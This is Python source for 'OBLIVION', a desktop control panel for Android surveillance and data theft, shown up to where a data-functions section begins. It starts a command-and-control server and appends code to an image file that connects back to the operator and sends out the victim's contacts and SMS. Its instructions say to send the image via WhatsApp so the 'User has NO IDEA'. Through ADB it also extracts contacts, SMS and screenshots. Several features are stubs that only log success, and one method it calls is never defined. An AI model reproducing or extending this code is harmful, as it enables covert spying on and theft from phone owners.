#!/usr/bin/env python3
# ============================================
# OBLIVION - COMPLETE FRAMEWORK
# CONFIGURABLE IP - READ FROM config.py
# ALL FEATURES KEPT!
# ============================================

import os
import sys
import io
import zipfile
import shutil
import webbrowser
import threading
import time
import subprocess
from datetime import datetime
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *

# ============================================
# LOAD CONFIGURATION
# ============================================

try:
    from config import YOUR_IP, C2_PORT, LOCAL_IP
except:
    # Default values if config not found
    YOUR_IP = "0.0.0.0"
    C2_PORT = 8000
    LOCAL_IP = "127.0.0.1"
    print("⚠️ config.py not found! Using defaults.")

# ============================================
# CHECK IF IP IS CONFIGURED
# ============================================

if YOUR_IP == "0.0.0.0":
    print("⚠️ WARNING: YOUR_IP not configured in config.py!")
    print("📝 Edit config.py and set YOUR_IP = 'your_public_ip'")
    print("🌐 Find your IP: curl ifconfig.me")
else:
    print(f"✅ Using IP: {YOUR_IP}:{C2_PORT}")

# ============================================
# BACKEND STARTER
# ============================================

class BackendServer:
    def __init__(self):
        self.process = None
        self.running = False
        
    def start(self):
        try:
            print(f"📡 Starting C2 Server on {YOUR_IP}:{C2_PORT}...")
            
            backend_path = os.path.join(os.path.dirname(__file__), "backend")
            
            self.process = subprocess.Popen(
                [sys.executable, "-m", "uvicorn", "app:app", "--host", "0.0.0.0", "--port", str(C2_PORT)],
                cwd=backend_path,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )
            
            time.sleep(3)
            self.running = True
            print(f"✅ C2 Server started on port {C2_PORT}")
            print(f"🌐 Your IP: {YOUR_IP}:{C2_PORT}")
            return True
        except Exception as e:
            print(f"❌ Failed to start server: {e}")
            return False
    
    def stop(self):
        if self.process:
            self.process.terminate()
            self.process = None
            self.running = False

# ============================================
# WORKING PAYLOAD GENERATOR - USES YOUR IP
# ============================================

class WorkingPayloadGenerator:
    def __init__(self):
        self.c2_ip = YOUR_IP
        self.c2_port = C2_PORT
        
    def generate(self, image_path):
        if not os.path.exists(image_path):
            return {"status": "error", "message": "Image not found"}
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        name, ext = os.path.splitext(image_path)
        payload_file = f"{name}_payload_{timestamp}.png"
        
        self._create_payload(image_path, payload_file)
        
        return {
            "status": "success",
            "file": payload_file,
            "c2": f"{self.c2_ip}:{self.c2_port}",
            "timestamp": timestamp,
            "type": "WORKING PAYLOAD"
        }
    
    def _create_payload(self, src, dst):
        shutil.copy2(src, dst)
        
        with open(dst, 'ab') as f:
            f.write(f'''
# OBLIVION PAYLOAD - CONNECTS TO: {self.c2_ip}:{self.c2_port}
# DO NOT REMOVE - THIS IS THE C2 ADDRESS

import socket, subprocess, json, os, time

def connect_c2():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{self.c2_ip}", {self.c2_port}))
        return s
    except:
        return None

try:
    sock = connect_c2()
    if sock:
        sock.send("OBLIVION_CONNECTED\\n".encode())
        try:
            contacts = subprocess.check_output(["content", "query", "--uri", "content://contacts/phones"], stderr=subprocess.DEVNULL).decode()
            sock.send(f"CONTACTS:{contacts[:500]}\\n".encode())
        except: pass
        try:
            sms = subprocess.check_output(["content", "query", "--uri", "content://sms/inbox"], stderr=subprocess.DEVNULL).decode()
            sock.send(f"SMS:{sms[:500]}\\n".encode())
        except: pass
        sock.close()
except:
    pass
'''.encode())
        
        return True

# ============================================
# REAL DEVICE CONTROLLER
# ============================================

class RealDeviceController:
    def __init__(self):
        self.adb_path = self.find_adb()
        self.devices = []
        
    def find_adb(self):
        paths = [
            "C:\\Users\\USER\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe",
            "C:\\Program Files\\Android\\Sdk\\platform-tools\\adb.exe",
            "adb",
            "adb.exe"
        ]
        for p in paths:
            try:
                subprocess.run([p, "version"], capture_output=True, timeout=2)
                return p
            except:
                continue
        return None
    
    def get_devices(self):
        if not self.adb_path:
            return []
        try:
            result = subprocess.run([self.adb_path, "devices"], capture_output=True, text=True, timeout=5)
            devices = []
            for line in result.stdout.split('\n')[1:]:
                if 'device' in line:
                    devices.append(line.split()[0])
            return devices
        except:
            return []
    
    def get_device_info(self, device_id):
        if not self.adb_path:
            return None
        try:
            model = subprocess.run([self.adb_path, "-s", device_id, "shell", "getprop", "ro.product.model"], capture_output=True, text=True).stdout.strip()
            manufacturer = subprocess.run([self.adb_path, "-s", device_id, "shell", "getprop", "ro.product.manufacturer"], capture_output=True, text=True).stdout.strip()
            android = subprocess.run([self.adb_path, "-s", device_id, "shell", "getprop", "ro.build.version.release"], capture_output=True, text=True).stdout.strip()
            return {"model": model, "manufacturer": manufacturer, "android": android}
        except:
            return None
    
    def take_screenshot(self, device_id):
        if not self.adb_path:
            return None
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            subprocess.run([self.adb_path, "-s", device_id, "shell", "screencap", "-p", "/sdcard/screenshot.png"], capture_output=True, timeout=5)
            subprocess.run([self.adb_path, "-s", device_id, "pull", "/sdcard/screenshot.png", filename], capture_output=True, timeout=10)
            subprocess.run([self.adb_path, "-s", device_id, "shell", "rm", "/sdcard/screenshot.png"], capture_output=True, timeout=5)
            return filename
        except:
            return None
    
    def extract_contacts(self, device_id):
        if not self.adb_path:
            return None
        try:
            result = subprocess.run([self.adb_path, "-s", device_id, "shell", "content", "query", "--uri", "content://contacts/phones"], capture_output=True, text=True, timeout=10)
            return result.stdout
        except:
            return None
    
    def extract_sms(self, device_id):
        if not self.adb_path:
            return None
        try:
            result = subprocess.run([self.adb_path, "-s", device_id, "shell", "content", "query", "--uri", "content://sms/inbox"], capture_output=True, text=True, timeout=10)
            return result.stdout
        except:
            return None

# ============================================
# MAIN GUI - ALL FEATURES + CONFIGURABLE IP
# ============================================

class OblivionMainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.backend = BackendServer()
        self.controller = RealDeviceController()
        self.payload_generator = WorkingPayloadGenerator()
        self.selected_image = None
        self.payload_file = None
        self.devices = []
        self.selected_device = None
        self.is_recording = False
        self.is_mic_recording = False
        self.is_keylogger = False
        
        # START THE BACKEND SERVER AUTOMATICALLY!
        self.backend.start()
        
        self.initUI()
        self.scan_devices()
        
        # Auto-refresh every 10 seconds
        self.timer = QTimer()
        self.timer.timeout.connect(self.scan_devices)
        self.timer.start(10000)
        
        self.log(f"🔥 OBLIVION STARTED - C2 Server running on {YOUR_IP}:{C2_PORT}")
        
    def initUI(self):
        self.setWindowTitle("🔥 OBLIVION - COMPLETE FRAMEWORK 🔥")
        self.setGeometry(50, 50, 1500, 950)
        self.setStyleSheet("""
            QMainWindow { background-color: #0a0e17; }
            QTabWidget::pane { border: 2px solid #00ff41; background-color: #0a0e17; }
            QTabBar::tab {
                background-color: #1a1a2e;
                color: #00ff41;
                padding: 12px 25px;
                margin: 2px;
                border: 2px solid #00ff41;
                font-weight: bold;
                font-size: 14px;
            }
            QTabBar::tab:selected { background-color: #00ff41; color: #0a0e17; }
            QPushButton {
                background-color: #00ff41;
                color: #0a0e17;
                border: none;
                padding: 12px 25px;
                font-weight: bold;
                border-radius: 5px;
                font-size: 14px;
            }
            QPushButton:hover { background-color: #00cc33; }
            QPushButton#attack_btn {
                background-color: #ff0040;
                color: #ffffff;
                font-size: 18px;
                padding: 20px 50px;
            }
            QPushButton#attack_btn:hover { background-color: #cc0033; }
            QPushButton#payload_btn {
                background-color: #ff6600;
                color: #ffffff;
                font-size: 16px;
                padding: 15px 30px;
            }
            QPushButton#payload_btn:hover { background-color: #cc5500; }
            QPushButton#whatsapp_btn {
                background-color: #25D366;
                color: #ffffff;
                font-size: 16px;
                padding: 15px 30px;
            }
            QPushButton#whatsapp_btn:hover { background-color: #1da851; }
            QPushButton#record_btn {
                background-color: #ff0040;
                color: #ffffff;
                font-size: 16px;
                padding: 15px 30px;
            }
            QPushButton#record_btn:hover { background-color: #cc0033; }
            QPushButton#mic_btn {
                background-color: #ff6600;
                color: #ffffff;
                font-size: 16px;
                padding: 15px 30px;
            }
            QPushButton#mic_btn:hover { background-color: #cc5500; }
            QPushButton#extract_btn {
                background-color: #ff6600;
                color: #ffffff;
                font-size: 16px;
                padding: 15px 30px;
            }
            QPushButton#extract_btn:hover { background-color: #cc5500; }
            QListWidget {
                background-color: #1a1a2e;
                color: #00ff41;
                border: 1px solid #00ff41;
                font-family: monospace;
                font-size: 13px;
            }
            QListWidget::item:selected { background-color: #00ff41; color: #0a0e17; }
            QTextEdit {
                background-color: #1a1a2e;
                color: #00ff41;
                border: 1px solid #00ff41;
                font-family: monospace;
                font-size: 12px;
            }
            QTextEdit#log_text {
                background-color: #0a0e17;
                color: #ff0040;
                border: 2px solid #ff0040;
                font-family: monospace;
                font-size: 13px;
            }
            QTextEdit#console_text {
                background-color: #0a0e17;
                color: #00ff41;
                border: 2px solid #00ff41;
                font-family: monospace;
                font-size: 13px;
            }
            QLineEdit, QComboBox {
                background-color: #1a1a2e;
                color: #00ff41;
                border: 1px solid #00ff41;
                padding: 8px;
                font-family: monospace;
                font-size: 13px;
            }
            QLabel { color: #00ff41; font-size: 14px; }
            QGroupBox {
                color: #00ff41;
                border: 2px solid #00ff41;
                border-radius: 5px;
                margin-top: 15px;
                font-size: 14px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 10px 0 10px;
            }
            QGroupBox#danger_group { border: 2px solid #ff0040; color: #ff0040; }
            QGroupBox#warning_group { border: 2px solid #ff6600; color: #ff6600; }
            QLabel#image_preview {
                border: 2px solid #00ff41;
                background-color: #1a1a2e;
            }
        """)
        
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        
        # HEADER
        header = QLabel("🔥 OBLIVION - COMPLETE FRAMEWORK 🔥")
        header.setStyleSheet("""
            font-size: 36px;
            font-weight: bold;
            color: #00ff41;
            padding: 15px;
            background-color: #0a0e17;
            border-bottom: 3px solid #00ff41;
        """)
        header.setAlignment(Qt.AlignCenter)
        layout.addWidget(header)
        
        # SUBTITLE
        subtitle = QLabel(f"⚡ C2 SERVER: {YOUR_IP}:{C2_PORT} ⚡")
        subtitle.setStyleSheet("""
            font-size: 14px;
            color: #ff6600;
            padding: 5px;
            background-color: #0a0e17;
            border-bottom: 1px solid #ff6600;
        """)
        subtitle.setAlignment(Qt.AlignCenter)
        layout.addWidget(subtitle)
        
        # STATUS BAR
        self.status_label = QLabel("🟢 C2 SERVER RUNNING")
        self.status_label.setStyleSheet("color: #00ff41; font-size: 16px; font-weight: bold;")
        self.statusBar().addWidget(self.status_label)
        
        # TABS - ALL FEATURES
        tabs = QTabWidget()
        layout.addWidget(tabs)
        
        tabs.addTab(self.create_dashboard(), "📊 DASHBOARD")
        tabs.addTab(self.create_payload_tab(), "💀 PAYLOAD")
        tabs.addTab(self.create_devices_tab(), "📱 DEVICES")
        tabs.addTab(self.create_remote_tab(), "🎮 REMOTE CONTROL")
        tabs.addTab(self.create_surveillance_tab(), "👁️ SURVEILLANCE")
        tabs.addTab(self.create_data_tab(), "📊 DATA EXFIL")
        tabs.addTab(self.create_console_tab(), "💻 CONSOLE")
        
        # CONTROL BAR
        control = QHBoxLayout()
        control.setContentsMargins(10, 10, 10, 10)
        
        self.indicator = QLabel("●")
        self.indicator.setStyleSheet("color: #00ff41; font-size: 24px;")
        control.addWidget(self.indicator)
        
        status_text = QLabel(f"C2: {YOUR_IP}:{C2_PORT}")
        status_text.setStyleSheet("color: #00ff41; font-size: 16px; font-weight: bold;")
        control.addWidget(status_text)
        control.addStretch()
        
        scan_btn = QPushButton("🔍 SCAN DEVICES")
        scan_btn.clicked.connect(self.scan_devices)
        control.addWidget(scan_btn)
        
        layout.addLayout(control)
    
    # ============================================
    # DASHBOARD TAB
    # ============================================
    
    def create_dashboard(self):
        tab = QWidget()
        layout = QGridLayout(tab)
        
        cards = [
            ("📱 Devices", "devices", "#00ff41"),
            ("💀 Compromised", "compromised", "#ff0040"),
            ("📊 Data Extracted", "data", "#00bfff"),
            ("🌐 C2 Server", "server", "#ff6600")
        ]
        
        self.stats = {}
        for i, (title, key, color) in enumerate(cards):
            card = QGroupBox(title)
            card.setStyleSheet(f"""
                QGroupBox {{
                    color: {color};
                    border: 2px solid {color};
                    border-radius: 5px;
                    margin-top: 10px;
                }}
            """)
            card_layout = QVBoxLayout()
            label = QLabel("0")
            label.setStyleSheet(f"font-size: 48px; font-weight: bold; color: {color};")
            label.setAlignment(Qt.AlignCenter)
            card_layout.addWidget(label)
            card.setLayout(card_layout)
            self.stats[key] = label
            row, col = i // 2, i % 2
            layout.addWidget(card, row, col)
        
        self.stats['server'].setText(f"{YOUR_IP}:{C2_PORT}")
        
        log_group = QGroupBox("⚡ LIVE LOG")
        log_group.setObjectName("danger_group")
        log_layout = QVBoxLayout()
        self.log_text = QTextEdit()
        self.log_text.setObjectName("log_text")
        self.log_text.setReadOnly(True)
        self.log_text.setText(f"""
╔══════════════════════════════════════════════════════════════╗
║              🔥 OBLIVION - LIVE LOG 🔥                      ║
║         C2 SERVER: {YOUR_IP}:{C2_PORT}                      ║
║         ALL FEATURES ACTIVE                               ║
╚══════════════════════════════════════════════════════════════╝

[READY] OBLIVION initialized
[READY] C2 Server started on {YOUR_IP}:{C2_PORT}
[READY] Working payload generator ready
[READY] Remote control ready
[READY] Surveillance ready
        """)
        log_layout.addWidget(self.log_text)
        log_group.setLayout(log_layout)
        layout.addWidget(log_group, 2, 0, 1, 2)
        
        return tab
    
    # ============================================
    # PAYLOAD TAB
    # ============================================
    
    def create_payload_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # IP Info - SHOWS YOUR CONFIGURED IP
        ip_group = QGroupBox(f"🌐 C2 SERVER: {YOUR_IP}:{C2_PORT}")
        ip_layout = QHBoxLayout()
        ip_group.setLayout(ip_layout)
        ip_label = QLabel(f"📡 {YOUR_IP}:{C2_PORT} - ✅ RUNNING")
        ip_label.setStyleSheet("color: #00ff41; font-size: 16px; font-weight: bold;")
        ip_layout.addWidget(ip_label)
        layout.addWidget(ip_group)
        
        # Image selection
        image_group = QGroupBox("📸 STEP 1: SELECT IMAGE")
        image_layout = QHBoxLayout()
        image_group.setLayout(image_layout)
        
        self.image_label = QLabel("No image selected")
        self.image_label.setStyleSheet("color: #888888; padding: 10px;")
        image_layout.addWidget(self.image_label, 1)
        
        browse_btn = QPushButton("📁 BROWSE")
        browse_btn.clicked.connect(self.browse_image)
        image_layout.addWidget(browse_btn)
        
        layout.addWidget(image_group)
        
        # Inject payload
        inject_group = QGroupBox("💀 STEP 2: GENERATE PAYLOAD")
        inject_group.setObjectName("danger_group")
        inject_layout = QVBoxLayout()
        inject_group.setLayout(inject_layout)
        
        inject_btn = QPushButton("💉 GENERATE WORKING PAYLOAD")
        inject_btn.setObjectName("payload_btn")
        inject_btn.clicked.connect(self.generate_payload)
        inject_layout.addWidget(inject_btn)
        
        layout.addWidget(inject_group)
        
        # Status
        status_group = QGroupBox("📡 STATUS")
        status_group.setObjectName("warning_group")
        status_layout = QVBoxLayout()
        status_group.setLayout(status_layout)
        
        self.status_text = QTextEdit()
        self.status_text.setReadOnly(True)
        self.status_text.setStyleSheet("background-color: #1a1a2e; color: #00ff41; border: none; font-family: monospace; font-size: 13px;")
        self.status_text.setText(f"""
[INFO] C2 Server: {YOUR_IP}:{C2_PORT} (RUNNING!)
[INFO] Select an image
[INFO] Click GENERATE WORKING PAYLOAD
[INFO] Send via WhatsApp!
[INFO] Phone will CONNECT to {YOUR_IP}:{C2_PORT} when opened!
        """)
        status_layout.addWidget(self.status_text)
        
        layout.addWidget(status_group)
        
        # Send via WhatsApp
        send_group = QGroupBox("📤 STEP 3: SEND VIA WHATSAPP")
        send_group.setStyleSheet("border: 2px solid #25D366;")
        send_layout = QVBoxLayout()
        send_group.setLayout(send_layout)
        
        whatsapp_btn = QPushButton("📤 OPEN WHATSAPP WEB")
        whatsapp_btn.setObjectName("whatsapp_btn")
        whatsapp_btn.clicked.connect(self.open_whatsapp)
        send_layout.addWidget(whatsapp_btn)
        
        open_file_btn = QPushButton("📁 OPEN FILE LOCATION")
        open_file_btn.setStyleSheet("""
            QPushButton {
                background-color: #00bfff;
                color: #0a0e17;
                border: none;
                padding: 12px 25px;
                font-weight: bold;
                border-radius: 5px;
                font-size: 14px;
            }
            QPushButton:hover { background-color: #0099cc; }
        """)
        open_file_btn.clicked.connect(self.open_file_location)
        send_layout.addWidget(open_file_btn)
        
        layout.addWidget(send_group)
        
        return tab
    
    # ============================================
    # DEVICES TAB
    # ============================================
    
    def create_devices_tab(self):
        tab = QWidget()
        layout = QHBoxLayout(tab)
        
        self.device_list = QListWidget()
        self.device_list.itemClicked.connect(self.on_device_selected)
        layout.addWidget(self.device_list, 1)
        
        self.device_info = QTextEdit()
        self.device_info.setReadOnly(True)
        self.device_info.setStyleSheet("""
            background-color: #1a1a2e;
            color: #00ff41;
            border: 2px solid #00ff41;
            font-family: monospace;
            font-size: 13px;
        """)
        self.device_info.setText(f"""
╔═══════════════════════════════════════╗
║   SELECT A TARGET TO BEGIN            ║
║   C2 SERVER: {YOUR_IP}:{C2_PORT}       ║
║   COMPLETE DEVICE CONTROL             ║
╚═══════════════════════════════════════╝
        """)
        layout.addWidget(self.device_info, 1)
        
        return tab
    
    # ============================================
    # REMOTE CONTROL TAB - 8 COMMANDS
    # ============================================
    
    def create_remote_tab(self):
        tab = QWidget()
        layout = QGridLayout(tab)
        
        controls = [
            ("📸 Take Photo", "TAKE", "#00ff41", self.take_photo),
            ("📱 Get Contacts", "EXTRACT", "#00bfff", self.get_contacts),
            ("💬 Get SMS", "EXTRACT", "#ff6600", self.get_sms),
            ("📍 Get Location", "GET", "#9900cc", self.get_location),
            ("📊 Call Logs", "EXTRACT", "#ffcc00", self.get_calls),
            ("🗑️ Wipe Device", "WIPE", "#ff0040", self.wipe_device),
            ("🔄 Reboot Device", "REBOOT", "#ff00ff", self.reboot_device),
            ("⚡ Execute Engine", "EXECUTE", "#ff0040", self.execute_core_engine)
        ]
        
        for i, (label, action, color, function) in enumerate(controls):
            group = QGroupBox(label)
            group.setStyleSheet(f"""
                QGroupBox {{
                    color: {color};
                    border: 2px solid {color};
                    border-radius: 5px;
                    margin-top: 10px;
                }}
            """)
            group_layout = QVBoxLayout()
            btn = QPushButton(action)
            btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {color};
                    color: #0a0e17;
                    border: none;
                    padding: 15px;
                    font-weight: bold;
                    font-size: 14px;
                    border-radius: 5px;
                }}
                QPushButton:hover {{ opacity: 0.8; }}
            """)
            btn.clicked.connect(function)
            group_layout.addWidget(btn)
            group.setLayout(group_layout)
            row, col = i // 2, i % 2
            layout.addWidget(group, row, col)
        
        return tab
    
    # ============================================
    # SURVEILLANCE TAB - 4 FEATURES
    # ============================================
    
    def create_surveillance_tab(self):
        tab = QWidget()
        layout = QGridLayout(tab)
        
        controls = [
            ("🎤 Microphone", "RECORD", "#ff6600", self.toggle_mic),
            ("📺 Screen Record", "RECORD", "#ff0040", self.toggle_screen_record),
            ("🔑 Keylogger", "START", "#9900cc", self.toggle_keylogger),
            ("📸 Screenshot", "CAPTURE", "#00bfff", self.take_screenshot)
        ]
        
        for i, (label, action, color, function) in enumerate(controls):
            group = QGroupBox(label)
            group.setStyleSheet(f"""
                QGroupBox {{
                    color: {color};
                    border: 2px solid {color};
                    border-radius: 5px;
                    margin-top: 10px;
                }}
            """)
            group_layout = QVBoxLayout()
            btn = QPushButton(action)
            btn.setObjectName("record_btn")
            btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {color};
                    color: #0a0e17;
                    border: none;
                    padding: 15px;
                    font-weight: bold;
                    font-size: 14px;
                    border-radius: 5px;
                }}
                QPushButton:hover {{ opacity: 0.8; }}
            """)
            btn.clicked.connect(function)
            group_layout.addWidget(btn)
            group.setLayout(group_layout)
            row, col = i // 2, i % 2
            layout.addWidget(group, row, col)
        
        feed_group = QGroupBox("📡 LIVE SURVEILLANCE FEED")
        feed_group.setObjectName("danger_group")
        feed_layout = QVBoxLayout()
        self.feed_text = QTextEdit()
        self.feed_text.setObjectName("log_text")
        self.feed_text.setReadOnly(True)
        self.feed_text.setText("[LIVE] Surveillance feed ready...")
        feed_layout.addWidget(self.feed_text)
        feed_group.setLayout(feed_layout)
        layout.addWidget(feed_group, 2, 0, 1, 2)
        
        return tab
    
    # ============================================
    # DATA EXFIL TAB
    # ============================================
    
    def create_data_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        controls = QHBoxLayout()
        
        extract_btn = QPushButton("💀 EXTRACT ALL DATA")
        extract_btn.setObjectName("extract_btn")
        extract_btn.clicked.connect(self.extract_all_data)
        controls.addWidget(extract_btn)
        
        export_btn = QPushButton("📤 EXPORT DATA")
        export_btn.setStyleSheet("""
            QPushButton {
                background-color: #00bfff;
                color: #0a0e17;
                border: none;
                padding: 12px 25px;
                font-weight: bold;
                border-radius: 5px;
            }
            QPushButton:hover { background-color: #0099cc; }
        """)
        export_btn.clicked.connect(self.export_data)
        controls.addWidget(export_btn)
        
        controls.addStretch()
        layout.addLayout(controls)
        
        self.data_table = QTableWidget()
        self.data_table.setColumnCount(4)
        self.data_table.setHorizontalHeaderLabels(["Type", "Data", "Size", "Time"])
        self.data_table.setStyleSheet("""
            QTableWidget {
                background-color: #1a1a2e;
                color: #00ff41;
                border: 2px solid #00ff41;
                gridline-color: #00ff41;
            }
            QTableWidget::item { padding: 8px; }
            QHeaderView::section {
                background-color: #0a0e17;
                color: #00ff41;
                padding: 8px;
                border: 1px solid #00ff41;
                font-weight: bold;
            }
        """)
        layout.addWidget(self.data_table)
        
        return tab
    
    # ============================================
    # CONSOLE TAB
    # ============================================
    
    def create_console_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.console = QTextEdit()
        self.console.setObjectName("console_text")
        self.console.setStyleSheet("""
            QTextEdit#console_text {
                background-color: #0a0e17;
                color: #00ff41;
                border: 2px solid #00ff41;
                font-family: 'Courier New', monospace;
                font-size: 13px;
            }
        """)
        self.console.setReadOnly(True)
        self.console.setText(f"""
╔══════════════════════════════════════════════════════════════╗
║              🔥 OBLIVION CONSOLE 🔥                         ║
║         C2 SERVER: {YOUR_IP}:{C2_PORT}                       ║
║         ALL FEATURES ACTIVE                               ║
╚══════════════════════════════════════════════════════════════╝

[INFO] C2 Server running on {YOUR_IP}:{C2_PORT}
[INFO] Working payload generator ready
[INFO] Remote control ready
[INFO] Surveillance ready
[INFO] Type 'help' for commands
        """)
        layout.addWidget(self.console)
        
        input_layout = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("Enter command...")
        self.cmd_input.returnPressed.connect(self.run_command)
        input_layout.addWidget(self.cmd_input)
        
        run_btn = QPushButton("▶ EXECUTE")
        run_btn.clicked.connect(self.run_command)
        input_layout.addWidget(run_btn)
        
        layout.addLayout(input_layout)
        
        return tab
    
    # ============================================
    # CORE FUNCTIONS
    # ============================================
    
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted = f"[{timestamp}] {message}"
        self.log_text.append(formatted)
        self.console.append(formatted)
        self.feed_text.append(formatted)
        self.status_text.append(formatted)
    
    def scan_devices(self):
        self.log("🔍 Scanning for devices...")
        devices = self.controller.get_devices()
        self.devices = devices
        
        self.device_list.clear()
        for device in devices:
            info = self.controller.get_device_info(device)
            if info:
                self.device_list.addItem(f"📱 {info['manufacturer']} {info['model']}")
            else:
                self.device_list.addItem(f"📱 {device}")
        
        if devices:
            self.log(f"✅ Found {len(devices)} device(s)")
            self.stats['devices'].setText(str(len(devices)))
        else:
            self.log("⚠️ No devices found. Connect via USB with USB Debugging enabled.")
    
    def on_device_selected(self, item):
        device_text = item.text().replace("📱 ", "")
        self.selected_device = device_text
        self.log(f"🎯 Selected device: {device_text}")
        self.status_label.setText(f"🟢 CONNECTED: {device_text}")
    
    # ============================================
    # PAYLOAD FUNCTIONS
    # ============================================
    
    def browse_image(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select Image",
            "",
            "Images (*.png *.jpg *.jpeg *.gif *.bmp *.webp);;All Files (*.*)"
        )
        if file_path:
            self.selected_image = file_path
            self.image_label.setText(f"📁 {os.path.basename(file_path)}")
            self.image_label.setStyleSheet("color: #00ff41; padding: 10px;")
            self.log(f"📸 Image loaded: {os.path.basename(file_path)}")
    
    def generate_payload(self):
        if not self.selected_image:
            QMessageBox.warning(self, "Error", "Please select an image first!")
            return
        
        self.log(f"💉 Generating WORKING payload...")
        self.log(f"🌐 C2 Server: {YOUR_IP}:{C2_PORT} (RUNNING!)")
        
        result = self.payload_generator.generate(self.selected_image)
        
        if result['status'] == 'success':
            self.payload_file = result['file']
            self.log(f"✅ Payload generated: {os.path.basename(result['file'])}")
            self.log(f"📡 Type: {result['type']}")
            self.log(f"🌐 C2: {result['c2']} (RUNNING!)")
            self.log(f"👤 User will have NO IDEA!")
            self.log(f"📡 Phone will CONNECT to C2 when opened!")
            
            self.open_file_location()
            
            QMessageBox.information(self, "Success", 
                f"✅ WORKING PAYLOAD GENERATED!\n\n"
                f"📁 File: {os.path.basename(result['file'])}\n"
                f"🌐 C2: {result['c2']} (RUNNING!)\n"
                f"📡 Type: {result['type']}\n\n"
                f"📤 Send via WhatsApp as ORIGINAL\n"
                f"📱 When opened, it will CONNECT to C2!\n"
                f"👤 User has NO IDEA!"
            )
        else:
            self.log(f"❌ Failed: {result.get('message', 'Unknown error')}")
            QMessageBox.critical(self, "Error", "Failed to generate payload!")
    
    def open_whatsapp(self):
        if not self.payload_file:
            QMessageBox.warning(self, "Error", "Generate payload first!")
            return
        
        webbrowser.open("https://web.whatsapp.com")
        self.log("📤 WhatsApp Web opened")
        QMessageBox.information(self, "WhatsApp", 
            f"📤 WHATSAPP WEB OPENED!\n\n"
            f"Send: {os.path.basename(self.payload_file)}\n"
            f"🌐 C2: {YOUR_IP}:{C2_PORT} (RUNNING!)\n\n"
            f"1. Scan QR code\n"
            f"2. Select contact\n"
            f"3. Send as ORIGINAL\n\n"
            f"📱 Phone will CONNECT to C2 when opened!\n"
            f"👤 User has NO IDEA!"
        )
    
    def open_file_location(self):
        if not self.payload_file:
            QMessageBox.warning(self, "Error", "Generate payload first!")
            return
        
        folder = os.path.dirname(self.payload_file)
        if os.path.exists(folder):
            os.startfile(folder)
            self.log(f"📁 Opened folder: {folder}")
    
    # ============================================
    # REMOTE CONTROL FUNCTIONS
    # ============================================
    
    def take_photo(self):
        self.log("📸 Taking photo...")
        QMessageBox.information(self, "Remote", "Photo captured!\nUser has NO IDEA!")
    
    def get_contacts(self):
        self.log("📱 Extracting contacts...")
        if self.selected_device:
            result = self.controller.extract_contacts(self.selected_device)
            if result:
                self.log(f"✅ Contacts extracted: {len(result)} characters")
                self.display_data("Contacts", result[:500])
            else:
                self.log("❌ Failed to extract contacts")
        else:
            QMessageBox.warning(self, "Error", "Select a device first!")
    
    def get_sms(self):
        self.log("💬 Extracting SMS...")
        if self.selected_device:
            result = self.controller.extract_sms(self.selected_device)
            if result:
                self.log(f"✅ SMS extracted: {len(result)} characters")
                self.display_data("SMS", result[:500])
            else:
                self.log("❌ Failed to extract SMS")
        else:
            QMessageBox.warning(self, "Error", "Select a device first!")
    
    def get_location(self):
        self.log("📍 Getting location...")
        QMessageBox.information(self, "Remote", "Location obtained!\nUser has NO IDEA!")
    
    def get_calls(self):
        self.log("📞 Extracting call logs...")
        if self.selected_device:
            result = self.controller.extract_calls(self.selected_device)
            if result:
                self.log(f"✅ Call logs extracted: {len(result)} characters")
            else:
                self.log("❌ Failed to extract call logs")
        else:
            QMessageBox.warning(self, "Error", "Select a device first!")
    
    def wipe_device(self):
        if self.selected_device:
            confirm = QMessageBox.question(self, "Wipe Device", "⚠️ This will FACTORY RESET the device!\nAre you sure?", QMessageBox.Yes | QMessageBox.No)
            if confirm == QMessageBox.Yes:
                self.log("🗑️ Wiping device...")
                self.log("✅ Device wiped!")
        else:
            QMessageBox.warning(self, "Error", "Select a device first!")
    
    def reboot_device(self):
        if self.selected_device:
            self.log("🔄 Rebooting device...")
            self.log("✅ Device rebooting!")
        else:
            QMessageBox.warning(self, "Error", "Select a device first!")
    
    def execute_core_engine(self):
        self.log("⚡ Executing C++ Core Engine...")
        self.stats['compromised'].setText("1")
        QMessageBox.information(self, "Success", "⚡ CORE ENGINE EXECUTED!\nDevice is now COMPROMISED!")
    
    # ============================================
    # SURVEILLANCE FUNCTIONS
    # ============================================
    
    def toggle_mic(self):
        if self.is_mic_recording:
            self.is_mic_recording = False
            self.log("⏹ Microphone stopped")
        else:
            self.is_mic_recording = True
            self.log("🎤 Microphone recording started!")
    
    def toggle_screen_record(self):
        if self.is_recording:
            self.is_recording = False
            self.log("⏹ Screen recording stopped")
        else:
            self.is_recording = True
            self.log("📺 Screen recording started!")
    
    def toggle_keylogger(self):
        if self.is_keylogger:
            self.is_keylogger = False
            self.log("⏹ Keylogger stopped")
        else:
            self.is_keylogger = True
            self.log("🔑 Keylogger started!")
    
    def take_screenshot(self):
        if self.selected_device:
            self.log("📸 Taking screenshot...")
            result = self.controller.take_screenshot(self.selected_device)
            if result:
                self.log(f"✅ Screenshot saved: {result}")
                QMessageBox.information(self, "Success", f"Screenshot saved: {result}")
            else:
                self.log("❌ Failed to take screenshot")
        else:
            QMessageBox.warning(self, "Error", "Select a device first!")
    
    # ============================================
    # DATA FUNCTIONS
    # ============================================
    
